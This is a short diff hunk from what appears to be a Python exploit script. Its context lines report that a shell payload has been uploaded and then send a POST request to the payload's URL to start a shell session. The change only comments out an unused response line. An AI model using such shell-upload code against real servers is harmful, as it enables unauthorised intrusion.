@@ -69,6 +69,6 @@ try:
     print("[!]Shell payload uploaded. Payload url: " + encoded_payload_url)
 
     shell_request = rq.post(encoded_payload_url)
-    req_response = rq.Response()
+    #req_response = rq.Response()
 
 except: "[!]Payload failed to load/Shell session failed to start"
